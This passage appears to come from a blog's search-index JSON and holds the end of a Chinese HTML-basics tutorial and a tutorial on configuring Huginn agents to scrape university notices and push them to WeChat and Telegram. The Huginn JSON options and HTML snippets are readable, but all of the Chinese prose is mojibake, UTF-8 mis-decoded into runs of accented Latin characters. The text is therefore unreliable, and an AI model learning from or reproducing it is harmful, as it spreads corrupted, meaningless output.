height=\"400\"&gt;æ‚¨çš„æµè§ˆå™¨ä¸æ”¯æŒiframeå”‰&lt;/iframe&gt; --- iframe å¯ç”¨ä½œé“¾æ¥çš„ç›®æ ‡ï¼ˆtargetï¼‰ã€‚ é“¾æ¥çš„ target å±æ€§å¿…é¡»å¼•ç”¨ iframe çš„ name å±æ€§ï¼š &lt;iframe src=\"https://miaotony.xyz\" width=\"600\" height=\"200\" name=\"iframe_miao\"&gt;&lt;/iframe&gt; &lt;p&gt;&lt;a href=\"https://miaotony.xyz/friends\" target=\"iframe_miao\"&gt;friends&lt;/a&gt;&lt;/p&gt; friends ï¼ˆå¯èƒ½éƒ¨ç½²åšå®¢çš„æ—¶å€™è¿™é‡Œç”¨ä¸äº† è„šæœ¬script å…ƒç´  &lt;script&gt; æ ‡ç­¾ç”¨äºå®šä¹‰å®¢æˆ·ç«¯è„šæœ¬ï¼Œæ¯”å¦‚ JavaScriptã€‚ script å…ƒç´ æ—¢å¯åŒ…å«è„šæœ¬è¯­å¥ï¼Œä¹Ÿå¯é€šè¿‡ src å±æ€§æŒ‡å‘å¤–éƒ¨è„šæœ¬æ–‡ä»¶ã€‚ &lt;noscript&gt; æ ‡ç­¾æä¾›æ— æ³•ä½¿ç”¨è„šæœ¬æ—¶çš„æ›¿ä»£å†…å®¹ã€‚ &lt;script type=\"text/javascript\"&gt; function sayhello(){ alert(\"Hello World!\"); } &lt;/script&gt; &lt;noscript&gt;Sorry, your browser does not support JavaScript!&lt;/noscript&gt; function sayhello(){ alert(\"Hello World!\"); } Sorry, your browser does not support JavaScript!ç‚¹è¿™é‡Œè¯•è¯•å‘—~ åé¢å­¦JavaScriptå†æ…¢æ…¢çœ‹ï¼ˆ å­—ç¬¦å®ä½“HTML ä¸­çš„é¢„ç•™å­—ç¬¦å¿…é¡»è¢«æ›¿æ¢ä¸ºå­—ç¬¦å®ä½“ã€‚ å½¢å¼ç±»ä¼¼äºè¿™æ · &amp;entity_name; &amp;#entity_number; å¦‚ &amp;lt; æˆ– &amp;#60; è¡¨ç¤ºå°äºå· &lt; ã€‚ ä¸é—´æ–­ç©ºæ ¼ &amp;nbsp; URL ç¼–ç URLï¼ŒUniform Resource Locatorï¼Œç»Ÿä¸€èµ„æºå®šä½ç¬¦ã€‚ URL åªèƒ½ä½¿ç”¨ ASCII å­—ç¬¦é›†æ¥é€šè¿‡å› ç‰¹ç½‘è¿›è¡Œå‘é€ã€‚ URL ç¼–ç ä¼šå°†å­—ç¬¦è½¬æ¢ä¸ºå¯é€šè¿‡å› ç‰¹ç½‘ä¼ è¾“çš„æ ¼å¼ã€‚ å®ƒä½¿ç”¨ â€œ%â€ å…¶åè·Ÿéšä¸¤ä½çš„åå…­è¿›åˆ¶æ•°æ¥æ›¿æ¢é ASCII å­—ç¬¦ã€‚ URL ä¸èƒ½åŒ…å«ç©ºæ ¼ã€‚URL ç¼–ç é€šå¸¸ä½¿ç”¨ + æ¥æ›¿æ¢ç©ºæ ¼ã€‚ ï¼ˆä¹‹å‰ç©CTFå°±é‡åˆ°è¿‡ä¸€ä¸ªé¢˜ï¼Œå®ƒçš„æŸä¸ªå‚æ•°é‡Œéœ€è¦è¾“å…¥åŠ å·ï¼ˆ+ï¼‰ï¼Œæ‰€ä»¥è¦å†™æˆ %2bã€‚ å°ç»“å…¥é—¨å°±åˆ°è¿™é‡Œäº†å§emmm è™½ç„¶æœ‰ç‚¹æ¯ç‡¥ï¼Œä½†æ‰€è§æ‰€å¾—è¿˜æ˜¯æŒºæœ‰è¶£çš„å“ˆå“ˆå“ˆã€‚ è¿›é˜¶å†æ¥çœ‹çœ‹HTMLçš„è¡¨å•ä¸è¾“å…¥ï¼Œè¿˜æœ‰H5ä¸­çš„æ–°å…ƒç´ ï¼Œç”»å¸ƒã€éŸ³è§†é¢‘ç­‰ç­‰ã€‚ æºœäº†æºœäº† å˜»å˜»å˜»","path":"2020/02/14/FrontEnd_HTML_Basic/"},{"title":"å°æƒ³æ³• | åˆ©ç”¨Huginn&TelegramBotå®ç°æ•™åŠ¡é€šçŸ¥è‡ªåŠ¨çˆ¬å–ä¸æ¨é€","text":"å‰è¨€å‰ä¸ä¹…åœ¨æœåŠ¡å™¨ä¸Šè£…å¥½äº†Huginnï¼ˆè¯¦è§è¿™é‡Œï¼šåŸºäºDockeræ­å»ºHuginnï¼‰ã€‚ è¿™å‡ å¤©æŠ˜è…¾äº†ä¸€ä¸‹ï¼Œå°è¯•ç€ç”¨å®ƒæ¥çˆ¬ç‚¹ä¸œè¥¿ç©ä¸€ä¸‹ï¼ˆbushi æƒ³äº†ä¸€ä¸‹ï¼Œå¹³æ—¶ä¼šå…³æ³¨æ•™åŠ¡çš„é€šçŸ¥ï¼Œæ¯æ¬¡éƒ½è¦è®¿é—®æ•™åŠ¡ç½‘ç«™ï¼Œè™½ç„¶è¯´ä¹Ÿä¸æ˜¯å¾ˆéº»çƒ¦ï¼Œä½†æˆ‘æƒ³è¦ä¸€ä¸ªè‡ªåŠ¨æ¨é€çš„å·¥å…·ã€‚æˆ–è€…è¯´ï¼Œä¸éœ€è¦æˆ‘ä¸»åŠ¨å»çœ‹æœ‰æ²¡æœ‰æ–°é€šçŸ¥ï¼Œè€Œæ˜¯æœ‰æ–°é€šçŸ¥å…¬å‘Šäº†å°±ç›´æ¥æ¨è¿‡æ¥ã€‚ï¼ˆç±»ä¼¼äºWebhookï¼Ÿ ğŸ˜ƒ è¯´åˆ°è¿™ä¸ªï¼Œå…¶å®ä¹‹å‰åœ¨ RSSHub ä¸Šçœ‹åˆ°è¿‡ä¸€ä¸ªï¼Œä¸è¿‡ç°åœ¨å¥½åƒå¤±æ•ˆäº†ã€‚è€ƒè™‘åˆ°ç›®å‰æ²¡æœ‰æŠ˜è…¾ RSSHub çš„æ‰“ç®—ï¼Œå¹²è„†å°±ç”¨ Huginn è‡ªå·±å¼„ä¸€ä¸ªå¥½äº†ã€‚ è¯´å¹²å°±å¹²äº†å•¦ã€‚ å“¦å¯¹äº†ï¼Œæœ€ç»ˆçš„æ•ˆæœå¤§æ¦‚è¿™æ ·â€”â€” é€šçŸ¥çš„çˆ¬å–ä¸å…¶è¯´ä¸“é—¨æ‰“é€ ä¸€ä¸ªæ•™åŠ¡é€šçŸ¥å…¬å‘Šçš„çˆ¬å–ï¼Œä¸å¦‚è¯´è®°å½•ä¸€ä¸‹ Huginn çš„åŸºæœ¬ä½¿ç”¨æ–¹æ³•ã€‚ è¯´å®è¯ï¼ŒHuginn çš„èµ„æ–™çœŸçš„å°‘ï¼Œæ„Ÿè§‰å›½å†…éƒ½æ²¡æœ‰å¤šå°‘ä»‹ç»è¿™ä¸ªçš„ï¼Œäºæ˜¯é‡åˆ°äº†ä¸å°‘é—®é¢˜ç»å¸¸ä¸çŸ¥é“æ€ä¹ˆåŠemmmã€‚ ä¸€äº›å°ä»‹ç»æ‰“å¼€ä½ å–œæ¬¢çš„æµè§ˆå™¨ï¼Œè¿›å…¥ Huginnï¼ˆé»˜è®¤ä¸º 127.0.0.1:3000ï¼‰ï¼Œæœ€ä¸Šæ–¹æœ‰å¦‚ä¸‹å‡ ä¸ªé€‰é¡¹ã€‚ å…¶ä¸­Agentså°±æ˜¯ä½ çš„ä¸€ä¸ªä¸ªå°å…µï¼Œä»–ä»¬å¯ä»¥äº’ç›¸åä½œï¼ŒæŒ‰ç…§æµæ°´çº¿ä¾æ¬¡å®Œæˆå„è‡ªçš„ä½¿å‘½ã€‚ Scenarios å°±æ˜¯è¿™äº›å°å…µçš„é›†åˆï¼Œæˆ–è€…è¯´æ˜¯æŸç§åœºæ™¯ï¼Œå®˜æ–¹æè¿°æ˜¯ Scenarios are named groups of Agents. Scenarios allow you to organize your agents, and to import and export sets of Agents to share. æ¯”å¦‚è¯´ä½ æœ‰Aã€Bã€Cä¸‰ä¸ªAgentï¼Œä»–ä»¬å…±åŒå®Œæˆä¸€ä¸ªä»»åŠ¡ï¼Œä½ å°±å¯ä»¥æŠŠä»–ä»¬é›†åˆèµ·æ¥ä½œä¸ºä¸€ä¸ªScenarioã€‚ Events æ˜¯å°å…µä»¬æ”¶é›†æ¥çš„ä¿¡æ¯ã€‚ Credentials ç”¨æ¥è®°å½•ä¸€äº›å¸¸é‡ï¼Œæˆ–è€…è¯´æ˜¯ç¯å¢ƒå˜é‡ã€‚ Credentials are used to store values used by many Agents. Examples might include â€œtwitter_consumer_secretâ€, â€œuser_full_nameâ€, or â€œuser_birthdayâ€. åœ¨ä½¿ç”¨æ—¶ï¼Œå°±å¯ä»¥åƒ {% credential Meow_API %} è¿™æ ·æ¥å¼•ç”¨ï¼Œå…¶ä¸­ Meow_API åœ¨ Credentials ä¸­è¿›è¡Œå®šä¹‰ã€‚ å¤§ä½“æ€è·¯Huginn é‡Œæœ‰å¾ˆå¤šç§ Agentï¼Œè¿™é‡Œç”¨åˆ°çš„å¯ä»¥è¯´æ˜¯æœ€å¸¸ç”¨çš„ Website Agent å’Œ Post Agent ã€‚ æ›´å¤šçš„å¯ä»¥å‚è€ƒå®˜æ–¹ Wiki çš„ä»‹ç»ï¼Œåœ¨è¿™é‡Œã€‚ è¿™ä¸ªé¡¹ç›®çš„æ€è·¯å°±æ˜¯ è®¿é—®æ•™åŠ¡ç½‘ç«™ï¼Œçˆ¬å–é€šçŸ¥å…¬å‘Šæ çš„æ ‡é¢˜åŠé“¾æ¥ æ ¹æ®å¾—åˆ°çš„é“¾æ¥ï¼Œè®¿é—®ç›¸åº”ç½‘å€ï¼Œè·å¾—é€šçŸ¥å…·ä½“å†…å®¹ å°†å¾—åˆ°çš„ä¿¡æ¯æ‰“åŒ…ï¼Œæ ¹æ® Server Chan å’Œ Telegram Bot API çš„æ ¼å¼å‘é€å³å¯ åˆ›å»ºè·å–ä¿¡æ¯çš„ AgentCrawler_AAO #1 Get Notice URLs é€‰æ‹© Website Agentï¼Œç•Œé¢å¦‚ä¸‹ï¼š Nameè‡ªå·±å–ä¸ªå–œæ¬¢çš„åå­—ã€‚ Scheduleå¯ä»¥æŒ‡å®šè¿è¡Œçš„å‘¨æœŸã€‚å¦‚æœåˆ—è¡¨é‡Œæ²¡æœ‰åˆé€‚çš„é€‰é¡¹çš„è¯ï¼Œå¯ä»¥é€‰æ‹©Neverï¼Œå†å¦å¤–åˆ›å»ºä¸€ä¸ªScheduler Agentï¼Œä»¥cronæ ¼å¼è‡ªå·±å†™ä¸€ä¸ªï¼Œç„¶ååœ¨Controllersé‡ŒæŒ‡å‘è¿™ä¸ªScheduler Agentã€‚ Keep eventså¯ä»¥å®šä¹‰è·å¾—Eventsåä¿ç•™çš„æ—¶é—´ï¼Œè¿‡æœŸåè‡ªåŠ¨ä¼šåˆ é™¤ä¹‹å‰çš„Eventsã€‚æ¯æ¬¡çˆ¬å–åï¼Œè·å¾—æ–°çš„æ•°æ®æ‰ä½œä¸ºä¸€ä¸ªeventï¼Œå¦åˆ™ä¸ä¼šè§¦å‘ä¸€ä¸ªæ–°çš„eventï¼Œå¯ä»¥è¯´åœ¨ä¸€å®šç¨‹åº¦ä¸Šèµ·åˆ°äº†å»é‡çš„ä½œç”¨ã€‚ï¼ˆå½“ç„¶å¦‚æœè¿˜æœ‰é‡å¤çš„è¯ï¼Œå¯ä»¥åé¢å†åŠ ä¸€ä¸ªDe-duplication Agentï¼‰ å¦‚æœæ•°æ®é‡è¿‡å¤§çš„è¯æœ€å¥½ä¸è¦è®¾æˆForeverã€‚ä½†æ˜¯è¦ç¡®ä¿åœ¨ä¸‹ä¸€ä¸ª Agent èƒ½å¤Ÿåœ¨ Event è¿‡æœŸä¹‹å‰è·å–åˆ°æ•°æ®ã€‚ Sourceså°±æ˜¯ä¸Šä¸€ä¸ªAgentï¼ŒReceiverså°±æ˜¯ä¸‹ä¸€ä¸ªAgentã€‚å‹¾é€‰Propagate immediatelyçš„è¯ï¼Œä¸Šä¸€ä¸ªAgentè·å–åˆ°æ•°æ®ååˆ™ç«‹å³æ‰§è¡Œè¿™ä¸ªAgentï¼Œå¦åˆ™ä¼šé—´éš”ä¸€åˆ†é’Ÿå†æ‰§è¡Œã€‚ï¼ˆå¼€å¯ä¼šåŠ é‡CPUè´Ÿæ‹…ï¼‰ Scenarioså°±æ˜¯é‚£ä¸ªAgentsçš„é›†åˆå•¦ã€‚ Optionsé‡Œæ˜¯å…·ä½“çš„é…ç½®ï¼Œæ˜¯JSONçš„æ ¼å¼ï¼Œå¯ä»¥å‚è€ƒå³è¾¹çš„æç¤ºæ¥è¿›è¡Œè®¾ç½®ã€‚ æ€ä¹ˆè¯´å¥½å‘¢ï¼Œå…¶å®ç®€å•çš„å‚æ•°å³è¾¹æ˜¯æœ‰äº†ï¼Œä½†æ˜¯å®é™…é…ç½®çš„æ—¶å€™è¿˜æ˜¯æœ‰ä¸å°‘é—®é¢˜ã€‚çœ‹å®˜æ–¹æ–‡æ¡£å§emmm https://huginnio.herokuapp.com/agents è¿™é‡Œæœ‰å…³äºAgentså„è‡ªAPIçš„è¯¦ç»†ä»‹ç»ã€‚ ä¸‹é¢æ˜¯optionsçš„å…·ä½“ä»‹ç»ã€‚ Website Agentå¯ä»¥çˆ¬å–æ¥è‡ªurl/url_from_event/data_from_eventçš„ä¿¡æ¯ã€‚ typeå¯ä»¥xml, html, json, or textã€‚ç›¸åº”çš„ç±»å‹æœ‰å„è‡ªçš„ä»‹ç»ï¼Œè¿™é‡Œæ˜¯HTMLç½‘é¡µï¼Œå°±ç”¨htmlå¥½äº†ã€‚ modeå¯ä»¥æ˜¯all, on_change, or mergeã€‚If you specify merge for the mode option, Huginn will retain the old payload and update it with new values. å³å¦‚æœé€‰æ‹©mergeï¼Œåˆ™ä¼šä¸ä¹‹å‰çš„ä¿¡æ¯åˆå¹¶ï¼Œè¿™ä¸ªåœ¨è·å–æ•™åŠ¡é€šçŸ¥çš„å…·ä½“å†…å®¹æ—¶ä¼šç”¨åˆ°ï¼Œä¹‹åä¸å†èµ˜è¿°ã€‚è¿™é‡Œåªéœ€è¦åœ¨å‡ºç°æ–°é€šçŸ¥çš„æ—¶å€™è§¦å‘ï¼Œæ‰€ä»¥ç”¨on_changeã€‚ extractextracté‡Œå°±æ˜¯è¦è§£æçš„å†…å®¹ï¼Œå¯ä»¥ç”¨a CSS selector in css or an XPath expression in xpath. ï¼ˆå¦‚æœtypeé‡Œé€‰textåˆ™å¯ä»¥ç”¨regexpæ­£åˆ™åŒ¹é…ï¼Œç„¶è€Œå¦‚æœè¦htmlæå–åå†æ­£åˆ™åŒ¹é…å°±éœ€è¦å†æ¥ä¸€ä¸ªAgentï¼Œæ„Ÿè§‰æœ‰ç‚¹è ¢emmmå¦‚æœæœ‰æ›´å¥½çš„åŠæ³•æ¬¢è¿æ¥å’Œæˆ‘äº¤æµä¸€ä¸‹å“ˆï¼‰ è¦æ³¨æ„çš„æ˜¯ï¼šè¿™ä¸ªè§£æçš„å†…å®¹æ˜¯æ ¹æ®urlæµè§ˆåç›´æ¥è·å¾—çš„é¡µé¢ï¼Œæ²¡æœ‰åŠ è½½æ–‡æœ¬ä¹‹å¤–çš„ä»»ä½•å†…å®¹ï¼Œæ²¡æœ‰ç»è¿‡JavaScriptæ¸²æŸ“ç­‰ç­‰ã€‚æˆ–è€…è¯´å°±æ˜¯ä½ F12åœ¨Networké‡Œçœ‹åˆ°çš„é¡µé¢åŠ è½½å‡ºæ¥çš„documentæˆ–xhrä¹‹ç±»å¾—åˆ°çš„responseã€‚ï¼ˆè¿™ä¸ªæ˜¯åœ¨åˆ©ç”¨ Huginn çˆ¬å–å…¶ä»–ç½‘ç«™çš„æ—¶å€™å‘ç°çš„ï¼‰ å¦‚æœéœ€è¦çˆ¬å–JavaScriptåŠ è½½çš„ç½‘é¡µï¼Œå¯ä»¥ä½¿ç”¨ Phantom Js Cloud Agentï¼Œè¿™ä¸ªéœ€è¦åœ¨PhantomJs Cloudç”³è¯·ä¸€ä¸ªAPIï¼Œæœ‰ä¸€å®šçš„å…è´¹é¢åº¦ã€‚è¿™ä¸ªAgentä¼šè¿”å›é¡µé¢çš„ç›¸åº”ä¿¡æ¯ï¼Œè¿˜å¯ä»¥å…·ä½“è®¾ç½®è¾“å‡ºJSONã€æˆªå›¾ç­‰ç­‰ã€‚ extracté‡Œä»¥JSONæ ¼å¼å†™è¦è§£æçš„å¯¹è±¡ï¼Œåé¢å°±ä¼šè¿”å› ç›¸åº”åå­—ä½œä¸ºKeyï¼Œç›¸åº”çš„å€¼ä½œä¸ºValue çš„JSONç»“æœã€‚ CSSå¯ä»¥è¿™æ ·æ‰¾â†“ï¼Œç›´æ¥å¤åˆ¶CSSè·¯å¾„ï¼Œå†è¿›è¡Œç¼©ç•¥å¤„ç†ã€‚ æ¯”å¦‚è¿™é‡Œå¤åˆ¶å‡ºæ¥æ˜¯ html body div.container-fluid div.main-content.clearfix div.left-content div.notice-announcement div#index_notice_content.tab-content div.tab-pane.active ul.tab-pane-ul li div.inform-content a ç„¶åå¤„ç† css pathã€‚ åŸå§‹è·¯å¾„è¿‡é•¿ï¼Œåˆ å»ä¸å¸¦ . æˆ– # çš„èŠ‚ç‚¹ï¼ˆèŠ‚ç‚¹é—´ä»¥ç©ºæ ¼â€œ â€åˆ†å‰²ï¼‰ï¼Œå¹¶åˆ å»æ¯ä¸ªèŠ‚ç‚¹åœ¨ . æˆ– #å‰çš„ç¬¬ä¸€ä¸ªæ ‡ç­¾ï¼Œå¾—åˆ°ï¼š .container-fluid .main-content.clearfix .left-content .notice-announcement #index_notice_content.tab-content .tab-pane.active .tab-pane-ul .inform-content a å‰åŠéƒ¨åˆ†å¯¹èŠ‚ç‚¹å®šä½ç”¨å¤„ä¸å¤§ï¼Œç»§ç»­ç¼©ç•¥ï¼Œäºæ˜¯å¾—åˆ° .tab-pane.active .tab-pane-ul .inform-content a éå¸¸è§„æƒ…å†µå¤„ç†ï¼š a. æœ‰äº›è·¯å¾„ä¸­çš„èŠ‚ç‚¹å¸¦ç©ºæ ¼ï¼Œå¦‚&lt;div class=\"packery-item article\"&gt;,è·¯å¾„ä¸­çš„ç©ºæ ¼ç”±.ä»£æ›¿ï¼Œæˆªå–ä¸º.packery-item.article b. å½“æŠ“å–å¤šç§ css path è§„åˆ™æ—¶ï¼Œç”¨é€—å·,åˆ†å‰² \"css\": \".focus-title .current a , .stress h2 a\", valueç”¨æ¥æå–æ ‡ç­¾ä¸­çš„å±æ€§ï¼Œå¯ä»¥åˆ©ç”¨XPath functionsã€‚ï¼ˆä¸­æ–‡ä»‹ç»ï¼‰ Xpath Functionsæ˜¯å¯ä»¥è¿›è¡ŒåµŒå¥—æ¥ç”¨çš„ï¼ˆå¥—å¨ƒï¼ˆx è¿™é‡Œç”¨äº† @hrefæ¥æå–é“¾æ¥ï¼Œç”¨string(.)æ¥æå–è¿™ä¸ªcssè·¯å¾„ä¸‹çš„å­—ç¬¦ä¸²ï¼Œç”¨ normalize-spaceå‡½æ•°æ¥å»é™¤å¤šä½™çš„ç©ºæ ¼ã€‚å¾—åˆ°çš„JSONè¡¨è¾¾å¼å¦‚ä¸‹ã€‚ \"extract\": { \"url\": { \"css\": \".tab-pane.active .tab-pane-ul .inform-content a\", \"value\": \"@href\" }, \"title\": { \"css\": \".tab-pane.active .tab-pane-ul .inform-content a\", \"value\": \"normalize-space(string(.))\" } } templateé™¤äº†ä¸Šé¢è¿™äº›ï¼Œè¿˜å¯ä»¥è®¾ç½®User Agentï¼Œä»¥åŠä¸€ä¸ªç”¨**Liquidæ¨¡æ¿è¯­è¨€ç¼–å†™çš„æ¨¡æ¿template**ç­‰ç­‰ã€‚ Liquid markup language. Safe, customer facing template language for flexible web apps. Liquidå®˜æ–¹ä»“åº“ï¼šhttps://github.com/Shopify/liquidã€‚è¿™é‡Œæœ‰å…³äºLiquidè¯­æ³•çš„ä¸­æ–‡ä»‹ç»ï¼šhttps://liquid.bootcss.com/ã€‚ Liquidä¹Ÿæ˜¯å¯ä»¥åµŒå¥—çš„ï¼Œåˆ©ç”¨ç®¡é“ | å¯ä»¥å°†å¤„ç†åçš„ç»“æœé€åˆ°ä¸‹ä¸€ä¸ªfilterã€‚ é™¤äº†Liquidè‡ªå¸¦çš„filterï¼ŒHuginnè¿˜æä¾›äº†ä¸€äº›è‡ªå·±çš„ç”¨æ³•ï¼Œè¯¦è§å®˜æ–¹æ–‡æ¡£ Formatting Events using Liquidã€‚ åœ¨è¿™é‡Œï¼Œç”±äºå¾—åˆ°çš„ href æ˜¯ç›¸å¯¹åœ°å€ï¼ˆå¦‚ /2020/0208/c11066a193409/page.htmï¼‰ï¼Œä¸ºäº†å¾—åˆ°ç»å¯¹åœ°å€ï¼Œåœ¨templateä¸­åˆ©ç”¨ {{ url | to_uri: _response_.url }} è¿›è¡Œå¤„ç†ã€‚ ï¼ˆåˆ«è¯´äº†ï¼Œè¿™å‡ å¤©æ‰¾éäº†XPath functionå’ŒLiquidç”¨æ³•ï¼‰ è®¾å¥½ä¹‹åå¯ä»¥ç‚¹å‡»Dry Runæ¥è¯•è¯•ï¼Œçœ‹çœ‹è¿è¡Œçš„ç»“æœï¼Œå†åšè¿›ä¸€æ­¥çš„ä¿®æ”¹ã€‚ äºæ˜¯æœ€ç»ˆå¾—åˆ°çš„Crawler_AAO #1 Get Notice URLs Options å¦‚ä¸‹ã€‚ { \"expected_update_period_in_days\": \"2\", \"user_agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\", \"url\": \"http://aao.nuaa.edu.cn/\", \"type\": \"html\", \"mode\": \"on_change\", \"extract\": { \"url\": { \"css\": \".tab-pane.active .tab-pane-ul .inform-content a\", \"value\": \"@href\" }, \"title\": { \"css\": \".tab-pane.active .tab-pane-ul .inform-content a\", \"value\": \"normalize-space(string(.))\" }, \"time\": { \"css\": \".tab-pane.active .tab-pane-ul .inform-data\", \"value\": \"normalize-space(.)\" } }, \"template\": { \"url\": \"{{ url | to_uri: _response_.url }}\" } } åˆ›å»ºè·å–å†…å®¹çš„ AgentCrawler_AAO #2 Get Notice Contents ä¸€æ ·æ˜¯Website Agentã€‚ Sourcesé€‰æ‹©ç¬¬ä¸€æ­¥åˆ›å»ºçš„Agentï¼Œå³ Crawler_AAO #1 Get Notice URLsã€‚ Optionsä¸­çš„urlå°±æ¥è‡ªç¬¬ä¸€ä¸ªAgentï¼Œäºæ˜¯å¯ä»¥ç”¨Liquidä¸­çš„ {{url}} ã€‚ mode ä¸º mergeï¼Œåˆå¹¶ä¹‹å‰çš„ä¿¡æ¯ä½œä¸ºæœ€ç»ˆçš„è¾“å‡ºã€‚å½“ç„¶ä¹Ÿå¯ä»¥åˆ©ç”¨æ¨¡æ¿templateä»¥åŠLiquidæ¥è°ƒç”¨ä¹‹å‰è·å–çš„å¯¹è±¡ã€‚ è¿™é‡Œå†åˆ©ç”¨Liquidä¸­çš„strip_htmlç”¨æ³•ï¼Œå°†æ‰€æœ‰çš„htmlæ ‡ç­¾å»é™¤ï¼Œæœ€ç»ˆå¾—åˆ°çš„contentå°±åªå‰©åŒ…å«\\nçš„å­—ç¬¦ä¸²äº†ã€‚ï¼ˆä¹‹å‰è¯•äº†XPath Functioné‡Œçš„normalize-spaceå‡½æ•°ï¼Œå‘ç°æ‰€æœ‰æ–‡å­—éƒ½è¿ä¸€èµ·äº†ï¼Œä¸‘æ­»äº†emmm æœ€ç»ˆå¾—åˆ°å¦‚ä¸‹çš„Optionsã€‚ { \"expected_update_period_in_days\": \"2\", \"user_agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\", \"url\": \"{{url}}\", \"type\": \"html\", \"mode\": \"merge\", \"extract\": { \"content\": { \"css\": \".wp_articlecontent\", \"value\": \".\" } }, \"template\": { \"content\": \"{{ content | strip_html }}\" } } å°†é€šçŸ¥æ¨é€åˆ°å¾®ä¿¡Crawler_AAO #3 WeChat Push è¿™é‡Œåˆ©ç”¨Server Chanæä¾›çš„å¾®ä¿¡æ¨¡æ¿æ¶ˆæ¯æ¨é€æœåŠ¡ï¼Œä¹‹å‰ä¹Ÿå†™è¿‡ä¸€ç¯‡ï¼šå°æƒ³æ³• | åŸºäºPushBear APIå®ç°å¾®ä¿¡æ¶ˆæ¯æ¨é€ã€‚è¿™æ¬¡å†æ¥ç”¨ä¸€ä¸‹å‘¢ã€‚ ç°åœ¨ PushBear ä¸€å¯¹å¤šçš„æ¨é€éœ€è¦ç»‘å®šè®¤è¯è¿‡çš„æœåŠ¡å·äº†ï¼Œä½†æ˜¯ä¸ªäººçš„æ¨é€è¿˜æ˜¯å¯ä»¥ç”¨çš„ã€‚ è¿™æ¬¡ç”¨çš„å°±æ˜¯Huginné‡Œçš„Post Agentå•¦ã€‚ methodè¿™ä¸ªAgentçš„methodå¯ä»¥æ˜¯get, post, put, patch, and deleteï¼ŒåŸºæœ¬çš„éƒ½èƒ½å®ç°ã€‚ Server Chané‚£è¾¹è¯´æ˜¯ç”¨GETï¼Œä½†å¥½åƒPOSTä¹Ÿè¡Œã€‚ post_urlå¡«å†™Server Chançš„APIåœ°å€ï¼Œ https://sc.ftqq.com/{% credential YourServerChanAPI %}.send? è¿™é‡ŒæŠŠAPIä¿å­˜åˆ°äº†Credentialsé‡Œï¼Œç›´æ¥ç”¨Liquidæ¨¡æ¿è°ƒç”¨å°±å¥½äº†ã€‚ content_typeè¿™é‡Œç”¨formï¼ˆapplication/x-www-form-urlencodedï¼‰ã€‚ payloadAPIæ¥å£æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œæ ‡é¢˜textï¼ˆå¿…é¡»ï¼‰ï¼Œæè¿°despï¼ˆå¯é€‰ï¼‰ï¼Œæ”¯æŒMarkdownè¯­æ³•ã€‚ è¿™é‡Œè‡ªå·±å®šä¹‰å°±å¥½äº†å•¦~ æ€ä¹ˆå¼€å¿ƒæ€ä¹ˆæ¥å˜»å˜»å˜»ã€‚ \"payload\": { \"text\": \"ã€{{title}}ã€‘\", \"desp\": \"{{ url }}{% line_break %}{% line_break %}{{ content | replace: \\\"\\n\\\", \\\"\\n\\n\\\" }}\" } è¦æ³¨æ„çš„æ˜¯ï¼šå¦‚æœç›´æ¥åœ¨å®ƒçš„æ¨¡æ¿é‡Œä¿®æ”¹å‚æ•°ä¿¡æ¯ï¼Œåˆ™**å¸¦æœ‰\\çš„ä¼šè‡ªåŠ¨è½¬ä¹‰ä¸º\\\\**ï¼ å› æ­¤ç›´æ¥å†™\\nä¸å¯è¡Œï¼Œè€Œè¦ç‚¹å‡»Toggle Viewç„¶åç›´æ¥å†™\\nã€‚æˆ–è€…ä¹Ÿå¯ä»¥è°ƒç”¨ Huginn æä¾›çš„æ–¹æ³• {% line_break %} ã€‚ å¦ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨Server Chanä¸­\\n\\næ‰èƒ½æ¢è¡Œï¼Œäºæ˜¯åˆ©ç”¨ Liquid çš„ {{ content | replace: \\\"\\n\\\", \\\"\\n\\n\\\" }} æŠŠ\\nç»™æ›¿æ¢æˆ\\n\\nã€‚ï¼ˆéœ€è¦ç›´æ¥å†™ï¼Œä¸èƒ½ç›´æ¥åœ¨å‚æ•°çš„æ¡†é‡Œæ”¹ã€‚ è¿˜è¦æ³¨æ„ä¿å­˜åå¦‚æœå†æ¬¡ä¿®æ”¹åˆ™\\nåˆä¼šè‡ªåŠ¨å˜ä¸º\\\\nï¼Œæ³¨æ„ç•™æ„ã€‚å»ºè®®ä¿å­˜ä¹‹å‰å…ˆDry Runè¯•è¯•ã€‚ emit_eventså¦‚æœè®¾ä¸ºtrueï¼Œåˆ™ä¼šè¿”å›ä¸€ä¸ªEventï¼Œå¯ä»¥å†åŠ ä¸€ä¸ªAgentæ¥åˆ¤æ–­æ˜¯å¦å‘é€æˆåŠŸã€‚ ä¾‹å¦‚æŸæ¬¡å‘é€æˆåŠŸåå¾—åˆ°çš„Eventå¦‚ä¸‹ï¼Œå…¶ä¸­çš„bodyéƒ¨åˆ†ä¸ºè¿”å›çš„æ•°æ®ã€‚ { \"body\": \"{\\\"errno\\\":0,\\\"errmsg\\\":\\\"success\\\",\\\"dataset\\\":\\\"done\\\"}\", \"status\": 200, \"headers\": { \"Server\": \"nginx\", \"Date\": \"Tue, 10 Feb 2020 09:00:51 GMT\", \"Content-Type\": \"text/html;charset=utf-8\", \"Transfer-Encoding\": \"chunked\", \"Connection\": \"keep-alive\", \"Expires\": \"Thu, 01 Jan 1970 00:00:01 GMT\", \"Cache-Control\": \"no-cache, must-revalidate\", \"Pragma\": \"no-cache\", \"Via\": \"100167\", \"Set-Cookie\": \"PHPSESSID=xxxxxxxxxx; expires=Wed, 11-Feb-2020 09:00:51 GMT; path=/; domain=sc.ftqq.com; HttpOnly\", \"Content-Length\": 47 } } å°†é€šçŸ¥æ¨é€åˆ°Telegram ChannelCrawler_AAO #3 Telegram Channel Push åŒæ ·ä½¿ç”¨çš„æ˜¯Post Agentã€‚ï¼ˆçœ‹äº†ä¸€ä¸‹ï¼ŒTelegram Agentå¥½åƒä¸å¤§çµæ´»ï¼Œè€Œä¸”è¿˜éœ€è¦å…ˆæœ‰ä¸€ä¸ªEvent Formatting Agentï¼Œè®©Eventä¸­åŒ…å«either a text, photo, audio, document or video key.ï¼‰ æ˜¨å¤©ç ”ç©¶äº†å¥½ä¹…Telegram Botï¼Œçœ‹äº†çœ‹å®˜æ–¹APIæ–‡æ¡£ï¼Œå‘ç°æ²¡æœ‰æƒ³è±¡ä¸­çš„é‚£ä¹ˆå›°éš¾233333ã€‚ é¦–å…ˆ @BotFather 